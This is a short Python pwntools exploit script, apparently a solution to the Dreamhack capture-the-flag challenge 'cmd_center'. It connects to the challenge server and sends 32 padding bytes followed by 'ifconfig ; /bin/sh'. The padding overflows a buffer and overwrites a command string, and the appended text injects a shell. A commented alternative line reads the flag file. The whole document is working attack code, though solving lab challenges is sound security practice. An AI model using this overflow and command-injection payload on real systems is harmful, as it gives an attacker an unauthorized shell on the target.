#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./cmd_center',checksec=False)

#p = process(exe.path)
p = remote('host3.dreamhack.games',12135)

payload = b'A'*32
payload += b'ifconfig ; /bin/sh'
#payload += b'ifconfig | cat flag' // cách 2
p.sendafter(b'Center name: ',payload)

p.interactive()